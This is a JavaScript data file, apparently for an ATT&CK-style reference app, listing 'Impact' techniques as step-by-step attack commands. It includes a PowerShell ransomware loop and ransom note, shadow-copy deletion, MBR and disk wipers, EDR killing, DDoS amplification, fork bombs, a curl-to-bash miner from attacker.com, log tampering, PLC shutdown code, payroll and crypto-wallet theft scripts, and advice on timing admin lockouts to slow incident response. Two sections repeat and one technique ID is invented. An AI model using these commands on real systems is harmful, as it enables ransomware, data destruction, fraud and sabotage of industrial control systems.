export const IMPACT = {
  id: "impact",
  name: "Impact",
  tacticId: "TA0040",
  subtitle: "Ransomware • Data Destruction • Service Stop • System Shutdown • Defacement • Network DoS • DDoS Amplification • Endpoint DoS • Fork Bomb • Disk Wipe • Inhibit Recovery • Firmware Corruption • Data Manipulation • Financial Theft/BEC • OT/ICS Disruption • Resource Hijacking • Account Access Removal",
  color: "#ef4444",
  techniques: [
    {
      name: "Data Encrypted for Impact",
      id: "T1486",
      summary: "Ransomware • AES encryption • key management • ransom note",
      description: "Encrypt victim data to extort ransom payments or cause operational disruption",
      tags: ["ransomware", "AES", "encryption", "T1486"],
      steps: [
        "Ransomware deployment pattern (pre-execution checklist):\n# Modern ransomware follows a consistent pattern designed to maximize damage and minimize recovery options\n# Pre-encryption phase (done BEFORE encrypting anything):\n# 1. Enumerate all drives and network shares (map everything first)\n# 2. Delete shadow copies and backups (ensure no free recovery)\n# 3. Disable services that lock files (SQL, Exchange, backup agents)\n# 4. Laterally move to backup server and destroy backup data\n# Encryption phase:\n# 5. Generate unique AES-256 key per file (hybrid crypto)\n# 6. Encrypt AES key with attacker RSA-2048 public key (only attacker can decrypt the AES key)\n# 7. Encrypt file in-place, rename with .LOCKED/.ENCRYPTED extension\n# 8. Drop ransom note (README.txt) in each directory\n# Post-encryption:\n# 9. Exfiltrate data before encryption (double extortion: pay or we publish)\n# Real-world patterns: LockBit, BlackCat (ALPHV), Cl0p, Black Basta, Rhysida",
        "Delete shadow copies FIRST (prevent free recovery):\n# VSS (Volume Shadow Copy Service) creates automatic point-in-time snapshots\n# Windows 10/11 and Server create them on updates and backups\n# If VSS intact: victim can right-click any file → 'Restore previous version' for free\n# Ransomware groups delete VSS as their FIRST action before any encryption\n# Multiple methods for redundancy (some may be blocked by EDR):\n$ vssadmin delete shadows /all /quiet\n$ wmic shadowcopy delete\n$ Get-WmiObject Win32_ShadowCopy | ForEach { $_.Delete() }  # PowerShell\n# Disable recovery mechanisms:\n$ bcdedit /set {default} bootstatuspolicy ignoreallfailures\n$ bcdedit /set {default} recoveryenabled no\n$ reagentc /disable  # Disable Windows Recovery Environment",
        "PowerShell ransomware demo (educational):\n> # WARNING: Destructive - for educational/lab use only\n> $key = [System.Security.Cryptography.Aes]::Create()\n> $key.GenerateKey(); $key.GenerateIV()\n> Get-ChildItem -Path C:\\TargetFolder -Recurse -File | ForEach {\n>     $data = [System.IO.File]::ReadAllBytes($_.FullName)\n>     $encrypted = # ... AES encrypt $data with $key\n>     [System.IO.File]::WriteAllBytes($_.FullName + '.encrypted', $encrypted)\n>     Remove-Item $_.FullName\n> }",
        "Ransomware deployment via SCCM/GPO:\n# Distribute ransomware binary to all domain systems simultaneously\n# Execute via GPO startup script or SCCM application deployment\n# Triggers at same time across all systems = maximum chaos\n$ SharpGPOAbuse --AddComputerTask --Command ransomware.exe --GPOName 'Default Domain Policy'",
        "Ransom note delivery:\n> $note = @'\n> Your files have been encrypted.\n> Send 50 BTC to: 1AttackerBTCAddress\n> Contact: attacker@protonmail.com\n> '@\n> Get-ChildItem -Path C:\\ -Recurse -Directory | ForEach { Set-Content -Path \"$_\\README.txt\" -Value $note }"
      ]
    },
    {
      name: "Data Destruction",
      id: "T1485",
      summary: "rm -rf • SDelete • wiper malware • firmware overwrite • MBR destroy",
      description: "Permanently destroy data to cause operational disruption or cover tracks",
      tags: ["wiper", "SDelete", "rm -rf", "T1485"],
      steps: [
        "Secure file deletion (prevent recovery):\n$ sdelete64.exe -p 7 -r C:\\SensitiveData\\\n# 7-pass DoD overwrite\n$ shred -vzn 7 /sensitive/file\n# shred overwrites file contents before deleting\n$ dd if=/dev/urandom of=/dev/sda  # Wipe entire disk (requires root!)",
        "Windows disk wiper:\n> // Low-level disk write to overwrite all sectors\n> using var device = new FileStream(\"\\\\\\\\.\\\\PhysicalDrive0\", FileMode.Open, FileAccess.Write);\n> byte[] zeros = new byte[512];\n> for (long i = 0; i < diskSize; i += 512) {\n>     device.Write(zeros, 0, 512);\n> }\n# Overwrites disk = unrecoverable without forensic tools",
        "MBR/VBR destruction (renders system unbootable):\n$ dd if=/dev/zero of=/dev/sda bs=446 count=1  # Wipe MBR\n> var mbr = new FileStream(\"\\\\\\\\.\\\\PhysicalDrive0\", FileMode.Open, FileAccess.Write);\n> mbr.Write(new byte[446], 0, 446);  # Overwrite MBR\n# System becomes unbootable - data still on disk but inaccessible\n# Used in: NotPetya, Shamoon, Destover",
        "UEFI/Firmware wipe:\n# Flash malicious firmware to motherboard\n# Firmware overwrites = hardware brick\n# SPI programmer or UEFI update tool\n# Intezer: LoJax used legitimate UEFI tools to persist in SPI flash\n# Recovery requires hardware reprogramming",
        "Mass database destruction:\n$ mysql -u root -p'PASS' -e 'DROP DATABASE production;'\n$ psql -U postgres -c 'DROP DATABASE prod_db;'\n$ redis-cli FLUSHALL\n$ mongo production --eval 'db.dropDatabase()'\n# Immediate operational impact\n# Recovery depends on backup availability"
      ]
    },
    {
      name: "Service Stop",
      id: "T1489",
      summary: "net stop • sc stop • kill processes • disable services",
      description: "Stop or disable critical system and business services to cause disruption",
      tags: ["net stop", "sc stop", "kill process", "T1489"],
      steps: [
        "Stop critical Windows services:\n$ net stop MSSQLServer\n$ net stop MSSQLSERVER\n$ net stop MySQL80\n$ net stop Apache2.4\n$ sc stop W3SVC  # IIS\n$ sc stop WinRM\n$ sc stop EventLog\n# Stop logging first, then stop business services",
        "Terminate security processes:\n$ taskkill /F /IM MsMpEng.exe  # Windows Defender\n$ taskkill /F /IM CSFalconService.exe  # CrowdStrike\n$ taskkill /F /IM SentinelAgent.exe  # SentinelOne\n$ taskkill /F /IM MBAMService.exe  # Malwarebytes\n# Kill AV/EDR processes before destructive actions",
        "Linux service disruption:\n$ systemctl stop apache2 nginx mysql postgresql\n$ service docker stop\n$ kill -9 $(pgrep -d',' python)\n$ pkill -9 java\n# Stop web, database, application services",
        "Disable services permanently:\n$ sc config MSSQLServer start= disabled\n$ sc config W3SVC start= disabled\n> Set-Service -Name 'MSSQLServer' -StartupType Disabled\n$ systemctl disable nginx\n$ systemctl mask nginx  # Cannot be started even manually",
        "Mass service stop via WMI:\n> Get-WmiObject Win32_Service | Where { $_.Name -match 'SQL|IIS|Apache|Tomcat' } | ForEach { $_.StopService() }\n# Stop all database and web services simultaneously"
      ]
    },
    {
      name: "System Shutdown/Reboot",
      id: "T1529",
      summary: "shutdown • reboot • IPMI • iLO • forced restart",
      description: "Shutdown or reboot systems to force recovery operations and cause disruption",
      tags: ["shutdown", "reboot", "IPMI", "T1529"],
      steps: [
        "Windows shutdown commands:\n$ shutdown /s /t 0 /f  # Immediate shutdown, force close apps\n$ shutdown /r /t 0 /f  # Immediate reboot\n$ shutdown /s /m \\\\192.168.1.100 /t 0 /f  # Remote shutdown\n# /f: force close running applications",
        "Linux shutdown:\n$ shutdown -h now\n$ init 0  # Halt\n$ systemctl poweroff\n$ reboot -f  # Force reboot\n# -f: force, don't sync filesystem (may cause corruption)",
        "Mass shutdown via WMI:\n$ wmic /node:192.168.1.0/24 os call Win32Shutdown 5\n# 5 = forced shutdown + power off\n# Target entire subnet\n> Get-ADComputer -Filter * | ForEach { Stop-Computer -ComputerName $_.Name -Force -Confirm:$false }",
        "IPMI/iLO/DRAC (out-of-band management):\n$ ipmitool -H 192.168.1.100 -U admin -P password chassis power off\n$ ipmitool -H 192.168.1.100 -U admin -P password chassis power reset\n# Out-of-band: works even if OS is hardened\n# Requires access to management network\n$ ipmitool -H 192.168.1.100 -U admin -P password mc reset cold",
        "Virtual environment shutdown:\n$ esxcli vm process kill --type=force --world-id $(esxcli vm process list | grep 'VM-Name' -A 5 | grep 'World ID' | awk '{print $3}')\n# Kill VMs on VMware ESXi host\n$ virsh destroy target-vm\n$ Invoke-VMScript -VM 'target' -ScriptText 'shutdown -h now'"
      ]
    },
    {
      name: "Defacement",
      id: "T1491",
      summary: "Web defacement • internal system defacement • ransom message",
      description: "Modify visual content of websites and systems to send messages or demonstrate access",
      tags: ["web defacement", "website modify", "T1491"],
      steps: [
        "Web server defacement:\n$ echo '<html><h1>Hacked by [Group]</h1></html>' > /var/www/html/index.html\n$ cp defacement.html /var/www/html/index.html\n# Replace main page content\n# Often politically motivated or proof of access",
        "WordPress defacement:\n$ mysql -u root -pPASS wordpress -e \"UPDATE wp_posts SET post_content='[defacement]' WHERE post_status='publish';\"\n# Or via file system:\n$ echo '<?php echo \"Hacked\"; ?>' > /var/www/html/wp-index.php\n# Database update affects all published pages",
        "Mass defacement (same server hosting):\n$ for dir in /var/www/html/*/; do cp defacement.html \"${dir}index.html\"; done\n$ find /var/www -name 'index.html' -exec cp defacement.html {} \\;\n# Deface all virtual hosts on compromised web server",
        "Network device banner modification:\n# Cisco IOS:\n$ conf t\n$ banner motd # This system has been pwned #\n$ end\n# Banner displayed on login - demonstrates access",
        "Desktop wallpaper change (internal):\n$ reg add 'HKCU\\Control Panel\\Desktop' /v Wallpaper /t REG_SZ /d C:\\ransom_note.jpg /f\n$ RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters\n# Changes desktop wallpaper to ransom note image\n# Visible impact to user immediately"
      ]
    },
    {
      name: "Network Denial of Service",
      id: "T1498",
      summary: "Volumetric DDoS • amplification • SYN flood • botnet • application layer",
      description: "Disrupt network services through volumetric or application-layer denial of service attacks",
      tags: ["DDoS", "SYN flood", "amplification", "botnet", "T1498"],
      steps: [
        "SYN flood (requires raw socket access):\n$ hping3 -S --flood -V -p 80 target.com\n# -S: SYN packets, --flood: as fast as possible\n$ nmap --script dos -p 80 target.com\n# Exhaust connection table on target server",
        "UDP amplification (DNS amplification):\n# Use open DNS resolvers to amplify traffic\n$ python3 dns_amp.py --target 1.2.3.4 --resolvers resolvers.txt --domain victim.com\n# 30-50x amplification: 1Gbps out → 30-50Gbps at target\n# Common amplifiers: DNS (28x), NTP (556x), SSDP (30x), memcached (51000x)",
        "NTP amplification (monlist):\n$ nmap -sU -p 123 --script ntp-monlist 192.168.1.100\n# Find NTP servers with monlist enabled\n$ python3 ntp_amp.py --target victim_ip --reflectors ntp_list.txt\n# NTP monlist: 556x amplification factor",
        "Application layer DDoS (HTTP flood):\n$ slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://target.com -x 24 -p 3\n# slowhttptest: https://github.com/shekyan/slowhttptest — Slowloris and more\n# Holds connections open exhausting server threads\n$ python3 goldeneye.py http://target.com -w 50 -s 500 -m random",
        "Botnet coordination for DDoS:\n# Direct C2-connected bots to target:\n# Broadcast to all bots via C2 channel\n# Command: DDoS target.com port 80 duration 3600\n# 10,000 bots × 10Mbps = 100Gbps attack\n# Mirai botnet command: ATTACK_UDP 1.2.3.4 60"
      ]
    },
    {
      name: "Disk Wipe",
      id: "T1561",
      summary: "Partition wipe • MBR overwrite • raw disk write • NotPetya-style",
      description: "Destroy disk data structures to render systems inoperable",
      tags: ["disk wipe", "MBR overwrite", "NotPetya", "T1561"],
      steps: [
        "Wipe master boot record:\n$ dd if=/dev/zero of=/dev/sda bs=4096 count=256  # First 1MB\n$ python3 -c \"open('/dev/sda','wb').write(b'\\x00'*512*2048)\"\n# First 1MB destruction: wipes MBR, partition table, boot sectors\n# System unbootable after next restart",
        "Partition table destruction:\n$ parted /dev/sda -s 'mklabel msdos'  # Rewrite partition table\n$ fdisk /dev/sda  # Delete all partitions\n# Loss of partition table = filesystem inaccessible\n# Data still on disk but unlabeled/unaddressable",
        "NotPetya-style attack chain:\n# 1. EternalBlue/Mimikatz for lateral movement\n# 2. Custom MBR bootloader written to disk\n# 3. On next boot: displays fake CHKDSK\n# 4. Actually: encrypts MFT (Master File Table)\n# 5. Reboots: system unbootable, ransom note displayed\n# No decryption key was ever intended to work",
        "Shamoon/Disttrack wiper:\n# 1. Establish C2, receive list of target files\n# 2. Overwrite files with garbage data\n# 3. Overwrite MBR with bootloader that shows image\n# 4. Schedule reboot\n# Used against Saudi Aramco, Italian oil company",
        "Wipe via Windows commands:\n$ format C: /q /y  # Quick format C drive (requires elevated)\n$ diskpart\n: select disk 0\n: clean  # Wipes partition table\n: create partition primary\n: format quick\n: exit\n# diskpart clean removes all partitions"
      ]
    },
    {
      name: "Inhibit System Recovery",
      id: "T1490",
      summary: "Shadow copy deletion • backup destruction • restore point removal",
      description: "Prevent system recovery by destroying backups, shadow copies, and recovery mechanisms",
      tags: ["shadow copy", "backup destruction", "recovery", "T1490"],
      steps: [
        "Delete Windows shadow copies:\n$ vssadmin delete shadows /all /quiet\n$ wmic shadowcopy delete\n$ Get-WmiObject Win32_Shadowcopy | ForEach { $_.Delete() }\n# Shadow copies = incremental backups used for quick recovery\n# Standard ransomware first step",
        "Disable Windows recovery:\n$ bcdedit /set {default} bootstatuspolicy ignoreallfailures\n$ bcdedit /set {default} recoveryenabled no\n$ reagentc /disable  # Disable Windows RE\n# Windows Recovery Environment (WinRE) used for system repair\n# Disabling prevents recovery boot",
        "Destroy backup software data:\n$ wbadmin delete catalog -quiet  # Delete Windows Server Backup catalog\n$ wbadmin disable backup  # Disable Windows Backup\n# Also target: Veeam, Backup Exec, Commvault agents\n$ net stop VeeamBackupSvc\n$ net stop BackupExecAgentAccelerator",
        "Network backup destruction:\n# Identify backup servers via network enumeration\n# Access backup server with compromised credentials\n$ nxc smb 192.168.1.50 -u admin -p pass --shares  # Find backup share\n$ del /s /f \\\\backup-server\\backups\\\n# Destroy or encrypt backup data before encrypting production",
        "Modify system restore point settings:\n$ reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore' /v DisableSR /t REG_DWORD /d 1 /f\n$ reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore' /v DisableConfig /t REG_DWORD /d 1 /f\n# Prevent creation of new restore points"
      ]
    },
    {
      name: "Endpoint Denial of Service",
      id: "T1499",
      summary: "Application exhaustion • fork bomb • memory exhaustion • CPU saturation",
      description: "Exhaust system resources to degrade or prevent service availability on targeted endpoints",
      tags: ["DoS", "fork bomb", "resource exhaustion", "T1499"],
      steps: [
        "Fork bomb (Linux):\n$ :(){ :|:& };:\n# Forks indefinitely consuming all process slots\n# System becomes unresponsive quickly",
        "Memory exhaustion:\n$ python3 -c \"x = [' ' * 10**7 for _ in range(10000)]\"\n# Allocate memory until OOM killer activates\n# Can kill critical processes",
        "Application-layer DoS:\n$ slowhttptest -c 10000 -H -g -o output -i 10 -r 200 -t GET -u http://target.com\n# Slowloris: exhaust server connection pool\n$ python3 slowloris.py target.com\n# Keep connections open with incomplete HTTP requests",
        "Windows resource exhaustion:\n$ FOR /L %i IN (1,0,2) DO start cmd\n# Launch processes in infinite loop\n> while ($true) { Start-Process cmd.exe }\n# PowerShell version",
        "Cryptographic DoS:\n# Force target to perform expensive crypto operations\n# Hash DoS: send inputs with hash collisions to hash table\n# TLS renegotiation DoS (CVE-2009-3555)\n$ python3 tlsdos.py target.com 443"
      ]
    },
    {
      name: "Firmware Corruption",
      id: "T1495",
      summary: "UEFI brick • SPI flash • BIOS overwrite • BMC firmware • iLO backdoor",
      description: "Corrupt or replace firmware to cause permanent hardware damage or establish deep persistence",
      tags: ["UEFI", "BIOS", "SPI flash", "firmware", "T1495"],
      steps: [
        "UEFI firmware corruption:\n# Write invalid firmware to SPI flash\n# System becomes unbootable (bricked)\n# Recovery requires hardware programmer\n# Requires admin/root access and specific tools\n$ fwupdmgr install corrupt_firmware.cab --allow-older --no-reboot-check",
        "BMC/IPMI firmware backdoor:\n# Baseboard Management Controller: out-of-band management\n# Compromise: gains persistent remote access even after OS reinstall\n# iLO, iDRAC, BMC - various vendors\n# Implant in BMC firmware survives any OS change\n$ ipmitool -H 192.168.1.100 -U admin -P password bmc reset cold",
        "Network device firmware:\n# Cisco router/switch firmware modification\n# RouterSploit for exploitation:\n$ routersploit\n> use scanners/autopwn\n> set target 192.168.1.1\n> run\n# After access: modify firmware image, upload\n# Cisco ROMMON modification for persistent backdoor",
        "UEFI LoJax-style implant:\n# Legitimate LoJack anti-theft software reimplemented by attackers\n# Writes malicious module to SPI UEFI flash\n# Survives: OS reinstall, hard drive replacement\n# Only removal: reflash SPI chip or replace motherboard\n$ flashrom -p internal:laptop=this_is_not_a_laptop -w attacker_uefi.rom",
        "Physical BIOS chip programming:\n# Requires physical access + SPI programmer\n# Remove BIOS chip or use in-circuit programmer\n$ flashrom -p ft2232_spi:type=232H -w malicious_bios.bin\n# Absolute persistence - survives everything short of chip replacement\n# Nation-state capability"
      ]
    },
    {
      name: "Data Manipulation",
      id: "T1565",
      summary: "Database tampering • financial record alteration • log manipulation • integrity attack",
      description: "Modify data to disrupt operations, cause financial harm, or cover tracks",
      tags: ["data tampering", "database manipulation", "financial fraud", "T1565"],
      steps: [
        "Database record manipulation:\n$ mysql -u root -pPASS -e 'UPDATE users SET balance=1000000 WHERE username=\"attacker\";'\n$ sqlcmd -S . -Q 'UPDATE Financial.dbo.Transactions SET Amount=Amount*0 WHERE Date > GETDATE()-7'\n# Modify financial records, user balances, inventory data",
        "Log file manipulation to cover tracks:\n$ sed -i '/192.168.1.100/d' /var/log/auth.log\n$ python3 -c \"import re; data=open('/var/log/syslog').read(); open('/var/log/syslog','w').write(re.sub(r'.*attacker.*\\n','',data))\"\n# Remove attacker IP from logs\n# Modify timestamps",
        "Config file tampering:\n$ echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config\n$ sed -i 's/password_min_len=8/password_min_len=1/' /etc/pam.d/common-password\n# Weaken security configurations",
        "Email/document content modification:\n# Modify in-transit email (AiTM attack)\n# Change bank account numbers in emailed invoices\n# Business Email Compromise (BEC) financial fraud\n# Intercept and modify documents before delivery",
        "Healthcare/OT data manipulation:\n# Modify patient records (EHR systems)\n# Change ICS/SCADA setpoints\n# Alter sensor readings to mask attack or cause physical damage\n# Pharmaceutical manufacturing recipe alteration"
      ]
    },
    {
      name: "Resource Hijacking",
      id: "T1496",
      summary: "Cryptomining • compute hijack • bandwidth hijack • cloud cost exhaustion",
      description: "Hijack system resources for attacker benefit, causing performance degradation and cost",
      tags: ["cryptomining", "resource hijack", "cloud abuse", "T1496"],
      steps: [
        "Deploy cryptominer on compromised hosts:\n$ ./xmrig -o pool.supportxmr.com:443 -u WALLET_ADDRESS -p worker1 --cpu-priority 1 --background\n$ curl -s http://attacker.com/miner.sh | bash\n# XMRig: most common Monero miner\n# CPU priority 1: low priority to avoid detection",
        "Container/Kubernetes cryptomining:\n$ kubectl run miner --image=xmrig/xmrig:latest -- --url pool.supportxmr.com:443 -u WALLET\n$ docker run -d --restart unless-stopped xmrig/xmrig --url pool.supportxmr.com -u WALLET\n# Deploy in container - isolated, harder to detect",
        "Cloud compute resource abuse:\n$ aws ec2 run-instances --image-id ami-miner --instance-type c5.18xlarge --count 100\n# Launch large compute instances in compromised cloud account\n# GPU instances for ETH mining: p3.16xlarge\n# Victim pays the cloud bill",
        "GPU mining on workstations:\n$ ./ethminer -G --farm-recheck 200 -S pool.2miners.com:2020 -O WALLET_ADDRESS\n# ETH/GPU mining on victim's high-end workstations\n# Can generate $5-50/day per GPU",
        "Bandwidth and botnet resource use:\n# Use compromised hosts for DDoS (botnet)\n# Use for proxy/VPN infrastructure (ProxyWare)\n# Use for click fraud and ad fraud\n# Spam relay and phishing infrastructure hosting"
      ]
    },
    {
      name: "Financial Theft",
      id: "T1657",
      summary: "Business Email Compromise • wire transfer fraud • cryptocurrency theft • payroll diversion",
      description: "Steal financial assets through fraudulent transfers, BEC, or cryptocurrency theft",
      tags: ["BEC", "wire transfer fraud", "payroll diversion", "T1657"],
      steps: [
        "Business Email Compromise (BEC) wire transfer:\n# Compromise CFO/CEO mailbox\n# Monitor for pending transactions via Graph API:\n$ curl -H 'Authorization: Bearer ACCESS_TOKEN' 'https://graph.microsoft.com/v1.0/me/messages?$search=\"wire transfer\"' | jq '.value[].subject'\n# Reply from CEO mailbox instructing change in bank details\n# Modify the bank account in the reply thread",
        "Invoice fraud via compromised vendor email:\n# Compromise vendor's email account\n# Intercept payment discussion threads\n# Send modified invoice with attacker bank account\n# Victim pays attacker account thinking it's the vendor",
        "Payroll diversion:\n# Access HR/payroll system with stolen credentials\n# Change direct deposit bank account for target employees\n# Payments redirect to attacker-controlled accounts\n$ curl -X PUT 'https://payroll.target.com/api/employee/update-direct-deposit' \\\n  -H 'Authorization: Bearer STOLEN_TOKEN' \\\n  -d '{\"account\": \"ATTACKER_ACCOUNT\", \"routing\": \"ATTACKER_ROUTING\"}'",
        "Cryptocurrency theft from hot wallets:\n# Compromise exchange account or DeFi wallet\n# Transfer using web3.py from compromised private key:\n$ python3 -c \"\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/API_KEY'))\nacct = w3.eth.account.from_key('STOLEN_PRIVATE_KEY')\ntx = acct.sign_transaction({'to':'ATTACKER_WALLET','value':w3.eth.get_balance(acct.address)-21000*w3.eth.gas_price,'gas':21000,'gasPrice':w3.eth.gas_price,'nonce':w3.eth.get_transaction_count(acct.address),'chainId':1})\nw3.eth.send_raw_transaction(tx.rawTransaction)\n\"\n# Exchange: change withdrawal address and initiate transfer\n# Convert to Monero (XMR) for untraceable funds",
        "Modify financial records for fraud:\n$ mysql -u root -pPASS financial_db -e \"\nUPDATE transfers SET destination_account='ATTACKER_ACCOUNT' WHERE status='pending';\n\"\n# Intercept and modify pending transfers\n# Or: create fraudulent transactions in accounting system"
      ]
    },
    {
      name: "System Configuration Discovery for Impact",
      id: "T1529.config",
      summary: "OT/ICS targeting • SCADA disruption • industrial control • PLC manipulation",
      description: "Target operational technology and industrial control systems for physical impact",
      tags: ["OT", "ICS", "SCADA", "PLC", "T1529"],
      steps: [
        "Enumerate OT/ICS devices on network:\n# OT protocols are industrial-specific — most have zero authentication by design\n# These protocols were designed for isolated networks, not internet-connected environments\n# Key OT protocol ports to scan:\n# 102: Siemens S7 (PLCs), 502: Modbus TCP (most common ICS protocol)\n# 2404: IEC 60870-5-104 (power grid SCADA), 20000: DNP3 (water/power utilities)\n# 44818: EtherNet/IP (Allen-Bradley PLCs), 4840: OPC UA (modern ICS)\n$ nmap -p 102,502,2404,20000,44818,4840 192.168.1.0/24 -sV --open\n# Siemens S7-specific enumeration (gets CPU type, firmware, run state):\n$ nmap -p 102 --script s7-info 192.168.1.100\n# Modbus device identification:\n$ nmap -p 502 --script modbus-discover 192.168.1.0/24",
        "Modbus enumeration and manipulation:\n# pymodbus: legitimate Python Modbus library\n$ python3 -c \"\nfrom pymodbus.client.sync import ModbusTcpClient\nc = ModbusTcpClient('192.168.1.100', port=502)\nc.connect()\nrr = c.read_holding_registers(0, 10, unit=1)\nprint(rr.registers)  # Read 10 holding registers\n\"\n# Write register: c.write_register(40001, 0, unit=1)  # Change setpoint",
        "Siemens S7 PLC attack (Stuxnet-style):\n# Use python-snap7 or plcscan\n$ python3 -c \"\nimport snap7\nclient = snap7.client.Client()\nclient.connect('192.168.1.100', 0, 1)  # rack 0, slot 1\nclient.plc_stop()  # Stop the PLC\n\"",
        "DNP3 outstation manipulation:\n# pydnp3: legitimate Python DNP3 library\n$ python3 -c \"\nimport pydnp3.opendnp3 as opendnp3\n# Connect to DNP3 outstation and send Direct Operate command\n# to control breakers/relays on power grid equipment\n\"\n# DNP3: SCADA protocol used in power grid, water, gas\n# Direct Operate: control outputs — open/close breakers, set setpoints",
        "OT network pivot via IT/OT convergence zone:\n# Modern facilities have IT/OT converged networks\n# Pivot from IT network to OT VLAN\n# Common: jump through historian server (OSIsoft PI, etc.)\n$ ssh -L 502:plc_ip:502 historian_server\n# Tunnel Modbus through historian SSH"
      ]
    },
    {
      name: "Network Denial of Service",
      id: "T1498",
      summary: "DDoS • amplification • botnet flood • volumetric • application-layer DoS",
      description: "Disrupt availability of target systems through volumetric or application-layer denial of service attacks",
      tags: ["DDoS", "amplification", "botnet flood", "T1498"],
      steps: [
        "Volumetric UDP flood with hping3:\n$ hping3 --udp -p 53 --flood target.com\n$ hping3 -S --flood -V -p 80 target.com\n# -S: SYN flood, --flood: max rate, -p 80: target port\n# Requires high bandwidth — use botnet for impact",
        "DNS amplification attack:\n# Spoof victim source IP, send DNS queries to open resolvers\n$ nmap -sU -p 53 192.168.1.0/24 --script dns-recursion\n# Find open recursive resolvers\n$ python3 dns_amplify.py --victim TARGET_IP --resolvers open_resolvers.txt --query 'ANY isc.org'\n# ANY query: ~50 byte request → 3000+ byte response\n# Amplification factor: ~60x",
        "HTTP/S application-layer DDoS (Layer 7):\n$ python3 goldeneye.py https://target.com -w 50 -s 500 -m random\n# goldeneye: HTTP keep-alive flood\n$ slowloris.py target.com --port 443 -s 500\n# slowloris: exhaust connection pool with slow requests\n# Hard to mitigate: uses legitimate HTTP connections",
        "NTP amplification:\n$ nmap -sU -p 123 192.168.1.0/24 --script ntp-monlist\n# Open NTP servers with monlist enabled: ~206x amplification\n$ python3 ntp_amplify.py --victim TARGET_IP --ntpservers ntplist.txt\n# monlist: tiny request → list of last 600 clients (large response)",
        "Memcached amplification (51,000x):\n$ nmap -p 11211 -sU 192.168.1.0/24  # Find exposed Memcached\n# 15-byte request → 750KB response = 51,000x amplification\n$ python3 memcached_amplify.py --victim TARGET_IP --servers memcached_ips.txt\n# Highest amplification factor of any known protocol"
      ]
    },
    {
      name: "Endpoint Denial of Service",
      id: "T1499",
      summary: "Resource exhaustion • CPU/memory fork bomb • disk fill • OS crash • service crash",
      description: "Degrade or crash individual endpoints through resource exhaustion and application-layer attacks",
      tags: ["resource exhaustion", "fork bomb", "disk fill", "crash", "T1499"],
      steps: [
        "CPU and memory exhaustion (fork bomb):\n$ :(){ :|:& };:  # Bash fork bomb — exponential process spawn\n$ python3 -c 'while True: import threading; threading.Thread(target=lambda:None).start()'\n# Exhausts all available process slots → system hangs\n# Requires no privileges on Linux",
        "Disk fill to disrupt services:\n$ dd if=/dev/zero of=/var/log/fill bs=1M count=99999\n$ fallocate -l 100G /tmp/fill.img\n# Fill disk → applications can't write logs/data → crash\n$ yes > /dev/sda  # Overwrite disk (destructive)\n# Combined: disk fill + log corruption → service disruption",
        "Memory leak exhaustion:\n$ python3 -c 'a=[]; [a.append(\" \"*1000000) for _ in iter(int,1)]'\n# Allocate memory until OOM killer triggers\n# Causes system to kill random processes to free memory\n# Web servers often killed first",
        "Application DoS via HTTP parameter flooding:\n$ curl -s -X POST 'https://target.com/search' -d 'q=A&q=B&q=C...'  # 10,000 params\n# PHP: hash collision DoS via crafted POST params\n# ReDoS: send malicious regex input to vulnerable apps:\n$ curl 'https://target.com/api?input=aaaaaaaaaaaaaaaaaaaaaa!'\n# Catastrophic backtracking regex → 100% CPU",
        "Windows resource exhaustion:\n$ for /L %i in (1,1,10000) do start /B cmd.exe  # CMD process bomb\n> while ($true) { Start-Process -NoNewWindow powershell } # PowerShell fork bomb\n# Handle exhaustion: too many open handles → system instability\n# Also: Event Log flooding to obscure other events:\n$ while ($true) { Write-EventLog -LogName Application -Source 'Update' -EntryType Error -EventId 9999 -Message 'x'*32768 }"
      ]
    },
    {
      name: "Account Access Removal",
      id: "T1531",
      summary: "Lock accounts • delete accounts • change passwords • revoke tokens",
      description: "Remove administrator access to prevent incident response and recovery",
      tags: ["lock accounts", "delete accounts", "change passwords", "T1531"],
      steps: [
        "Lock and disable admin accounts (timing is critical):\n# Account lockout is typically done as a final step — JUST BEFORE encrypting\n# If done too early: IR team detects account issues and responds before encryption\n# Sequence: encrypt first → THEN lock accounts (or simultaneously)\n# Disable built-in Administrator (can't be deleted but can be disabled):\n$ net user administrator /active:no\n# Set random password on Administrator (forces lockout even if re-enabled):\n$ net user administrator '*'  # Prompts for new random password\n# Mass disable all Domain Admin accounts:\n$ Get-ADGroupMember 'Domain Admins' -Recursive | Get-ADUser | Disable-ADAccount\n# Lock out all DA accounts before deploying ransomware to maximize chaos\n# IR team wakes up: data encrypted AND no admin access = maximum response time",
        "Change domain admin passwords:\n$ net user administrator 'NewRandomPass123!' /domain\n> Get-ADUser -Filter {MemberOf -RecursiveMatch 'Domain Admins'} | Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString 'Random' -AsPlainText -Force)\n# Prevents incident response team from using existing creds",
        "Delete cloud accounts:\n$ aws iam delete-user --user-name admin\n$ az ad user delete --id admin@target.com\n$ gcloud iam service-accounts delete target@project.iam.gserviceaccount.com\n# Removes cloud access for legitimate administrators",
        "Revoke OAuth tokens and sessions:\n$ az ad app credential delete --id APP_ID --key-id KEY_ID\n$ aws iam update-access-key --access-key-id KEY --status Inactive --user-name admin\n# Invalidate all active sessions and API tokens\n# Force re-authentication which will fail (passwords changed)",
        "Delete SSH authorized keys:\n$ truncate -s 0 /root/.ssh/authorized_keys\n$ find /home/ -name authorized_keys -exec truncate -s 0 {} \\;\n# Remove legitimate admin SSH access\n# Prevents recovery via SSH"
      ]
    }
  ]
};